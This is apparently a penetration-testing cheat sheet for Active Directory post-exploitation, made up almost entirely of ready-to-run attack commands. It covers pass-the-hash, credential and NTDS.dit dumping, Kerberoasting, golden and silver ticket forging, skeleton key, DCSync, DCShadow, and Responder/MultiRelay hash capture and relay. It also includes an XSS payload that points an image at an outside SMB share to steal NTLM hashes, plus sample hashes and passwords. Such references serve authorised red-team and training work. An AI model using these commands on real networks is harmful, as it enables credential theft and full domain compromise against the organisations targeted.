---
title: Active Directory
category: Post-Exploitation
order: 89
---

>**Install AD Tools on compromised workstation**

* On attacker machine install RSAT AD tools
* Find Microsoft.ActiveDirectory.Management.dll
* Copy it to the target system and run <code>Import-Module .\Microsoft.ActiveDirectory.Management.dll</code>
* Example: <code>shell powershell -ep bypass -command "Import-Module .\Microsoft.ActiveDirectory.Management.dll; Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne \"$null\"} -Properties msDS-AllowedToDelegateTo" </code>

>**Pass-The-Hash**

mimikatz | <code> # privilege::debug; # token::elevate; sekurlsa::pth /user:username /domain:domain.local /dc:dc01.sec560.local </code>
xfreerdp | <code> xfreerdp /u:username /d:domain.local /pth:0b6c42339fca6848b5f8eed5f18e6a45  /v:10.10.10.20 </code>
Powerpick SMB | <code> Invoke-SMBExec -Target UFC-WEBPROD -Domain USFUN -Username webprodadmin -Hash a46261881a9af541be204dcf62ba4f7b -Command "C:\PerfLogs\beacon2.exe" -verbose </code>
Powerpick | <code> 


>**Getting Hashes**

**Powersploit**

{% highlight bash %}
Dump credentials on multiple remote machines.
Invoke-Mimikatz -DumpCreds -ComputerName @(“sys1", “sys2") 
Dump certs on a local machine.
Invoke-Mimikatz –DumpCerts
{% endhighlight %}

**Impacket**

{% highlight bash %}
#Saves SAM/LSA/Cached Creds from registry to %SYSTEMROOT%\\Temp
#Domain Users / hashes using [MS-DRDS] DRSGetNCChanges() replication
#Extract NTDS.dit via vssadmin with smbexec
#Consider using -exec-method wmiexec
impacket-secretsdump sec560.local/svcsqlserver:Jabbathehut23@10.10.10.5
impacket-secretsdump sec560.local/svcsqlserver:Jabbathehut23@10.10.10.5 -just-dc-user krbtgt
{% endhighlight %}

**Shadow copy of ntds.dit**

**vssadmin:**
{% highlight bash %}
C:\>vssadmin.exe list shadows
C:\>vssadmin create shadow /for=c:
C:\>vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'c:\'
    Shadow Copy ID: {8ce7d8aa-1257-4478-9869-7082d7c9664e}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2

C:\>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit C:\extraction\ntds.dit

C:\>get C:\extraction\system
[*] Downloading C:\\extraction\system
C:\>get C:\extraction\ntds.dit
[*] Downloading C:\\extraction\ntds.dit

**Impacket:**
{% highlight bash %}
$ impacket-secretsdump -ntds ntds.dit -system system -outputfile dump LOCAL
{% endhighlight %}

>**Kerberoasting**

Request RC4 service tickets from the DC using SPN values.  Focus on service accounts (not computer accounts) since they could have weaker passwords

**Powershell**

{% highlight bash %}
#Powerview
Get-NetUser –SPN

#ActiveDirectory Module 
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName



https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1
{% endhighlight %}

**Impacket:**

{% highlight bash %}
impacket-GetUserSPNs -request sec560.local/john.doe -dc-ip 10.10.10.5
{% endhighlight %}


>**Get Ticket from DC:**

**Interacts with the DC:**

{% highlight bash %}
#Powershell
Add-Type -AssemblyNAme System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList “MSSQLSvc/ops-file.offensiveps.powershell.local:SQLEXPRESS”

#Powerview
Request-SPNTicket
{% endhighlight %}

**Impacket:** 

{% highlight bash %}
impacket-getTGT -hashes aad3b435b51404eeaad3b435b51404ee:735c64192b87eb71a512782fdab380a9 -dc-ip 10.10.10.5 domain.local/john.doe
{% endhighlight %}

>**OverPass-the-Hash**

Even if NTLMv2 authentication is disabled, the NTLM hash can be used to "kick off" the kerberos process and request tickets for a certain service.

Mimikatz:
{% highlight bash %}
kerberos:ptt
{% endhighlight %}

{% highlight bash %}
impacket-getTGT -hashes aad3b435b51404eeaad3b435b51404ee:735c64192b87eb71a512782fdab380a9 -dc-ip 10.10.10.5 domain.local/john.doe
export KRB5CCNAME=john.doe.ccache
impacket-wmiexec -k -no-pass -dc-ip 10.10.10.5 hostnameHere whoami
{% endhighlight %}

>**Golden Ticket**

**Mimikatz/Impacket:** Obtain domain information:

{% highlight bash %}
impacket-wmiexec domain.local/svcsqlserver:Password@10.10.10.5 ipconfig /all
...Primary DNS Suffix...

impacket-lookupsid domain.local/svcsqlserver:Password@10.10.10.5 
...Domain SID...
 {% endhighlight %}


**Mimikatz:** Crafted ticket granting ticket (TGT) using the krbtgt nt hash 

{% highlight bash %}
kerberos::golden /krbtgt:e19ccf75ee54e06b06a5907af13cef42 /admin: root /domain:domain.private /sid:s-1-5-21-1458117341-2101632361-2707338445-500 /ticket:golden.ticket.bin

kerberos::ptt golden.ticket.bin

 {% endhighlight %}

**Impacket:** Crafted ticket granting ticket (TGT) using the krbtgt nt hash 

{% highlight bash %}
impacket-ticketer -domain domain.local -domain-sid S-1-5-21-721047592-4068106649-2889670365 -aesKey 8f20a34aec155f272a065b0314ec68700bcba9e5e2b242015133fc8cf793421d Administrator
impacket-ticketer -domain domain.local -domain-sid S-1-5-21-721047592-4068106649-2889670365 -nthash 5525e655c06299c7e4179e2cc5621fb3 Administrator
{% endhighlight %}

**Impacket:** Export the ticket to the Kali and Add Target Host (to log into) to /etc/hosts

{% highlight bash %}
export KRB5CCNAME=Administrator.ccache
{% endhighlight %}


**Impacket:** Run a command using the ticket:

{% highlight bash %}
impacket-wmiexec -k -no-pass -dc-ip 10.10.10.5 hostnameHere whoami 
{% endhighlight %}


>**Silver Ticket**

If you obtain the password for a  processesses running as a services (e.g., local system, network service, local service)(not computer accounts).  You can forge a TGS with increased privs in the privilege Attribute Certificate (PAC). Usable if golden ticket gets detected or krbtgt hash is changed.

**Mimikatz**
{% highlight bash %}
(note rc4 is NTLM hash for the target box - dc01)
kerberos::golden /sid:S-1-5-21-721047592-4068106649-2889670365 /domain:sec560.local /target:dc01.sec560.local /service:cifs /rc4:c918697c8e0c3c0dd936e3eef1f563d2 /user:regularjoe /ptt
{% endhighlight %}

**Impacket**
{% highlight bash %}
(note NTLM is NTLM hash for the target box - dc01)
$ impacket-ticketer -domain sec560.local -domain-sid S-1-5-21-721047592-4068106649-2889670365 -nthash c918697c8e0c3c0dd936e3eef1f563d2 -spn CIFS/dc01.sec560.local regularjoe
{% endhighlight %}


>**Skeleton Key**

Patches memory for kerberos (only RC4) to allow login to any account using a predefined password (e.g., mimikatz)

{% highlight bash %}
priviledge::debug
misc::skeleton
{% endhighlight %}

>**Skeleton Key**

Patches memory for kerberos (only RC4) to allow login to any account using a predefined password (e.g., mimikatz)

{% highlight bash %}
priviledge::debug
misc::skeleton
{% endhighlight %}


>**DC Sync**

Uses directory replication service remote protocol (detectable by seeing DRSR traffic to a non-DC) to obtain password hashes for domain accounts.

**Mimikatz**

{% highlight bash %}
lsadump::dcsync /user:Administrator
{% endhighlight %}

**DSInternals**

{% highlight bash %}
Get-ADReplAccount -SamAccountName 'AZUREADSSOACC$' -Domain contoso `
-Server lon-dc1.contoso.local
{% endhighlight %}

* https://github.com/MichaelGrafnetter/DSInternals

>**DC Shadow**

A workstation is upgraded to a DC, a change is made (e.g., change a password to target account), and then replicated to the DC.  Windows event logs normally take place on the server that the change is made on, which won't happen because it was on the worksation that was upgraded. Detectable due to traffic to a non-DC and events for temporary creation of a DC and deletion (5137 object creation and 5141 object deletion)

{% highlight bash %}
Mimikatz Instance 1 (NT Authority/System Context):
lsadump::dcshadow /object:CN=Administrator,CN=Users,DC=SYNCTECHLABS,DC=COM /attribute:description /value:"DCShadow was here"

Mimikatz Instance 2 (Domain Admin Context):
lsadump::dcshadow /push 

{% endhighlight %}


>**Geting NetNTLMv2 Challenge/Response**


**Responder**
Relies on two protocols for name resolution NBT-NS and LLMNR (successor to NBT-NS) which resolve hostnames by sending request to the multicast address. MS16-077 patched the default WPAD settings to just DNS (no broadcast) and disabled auto login to proxy servers. This could also be coaxed through:

*  Web application vulnerabilities like XSS <code>(<img src="\\34.199.61.69\fakeshare" sytle="visibility hidden">)</code>, LFI, RFI, XXE, and XPATH
* Vulnerability scanners connecting to 445
* Embedding a picture on an SMB share in a word document
* Putting an icon hosted on an SMB share on a frequently visited share (SCF file) 
* https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/

Responder - NTLMv2 Passwords | <code> Responder.py -I eth0 -wrf </code>
Responder - Basic/ForceWpad Auth | <code> python ./Responder.py -I eth0 -wfFbv </code>

**Cracking NetNTLMv2 hashes**

<code>hashcat -m 5600 has.txt password_list.txt -o cracked.txt</code>
<code>john --format=netntlmv2 /opt/responder/logs/SMBv2-NTLv2-SSP-IPADDRESS.txt</code>


> **Replay NTLMv2**

NMAP - SMB Security Mode | <code> nmap --script smb-security-mode.nse -p445 127.0.0.1 </code>
RunFinger | <code> RunFinger.py -i 10.1.1.0/24 </code>
Set up Resonder | <code> gedit Responder.conf -> Change SMB and HTTP to Off </code>
Start Responder | <code> python ./Responder.py -I eth0 -rv </code>
Start MultiRelay Command | <code> /opt/Responder/tools/MultiRelay.py -t [target host] -c [shell command] -u ALL </code>
Start MultiRelay Shell | <code> /opt/Responder/tools/MultiRelay.py -t [target host] -u ALL </code>
Start MultiRelay Dump Hashes | <code> /opt/Responder/tools/MultiRelay.py -t [target host] -u ALL -d </code>




>**Tools**

* [accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)


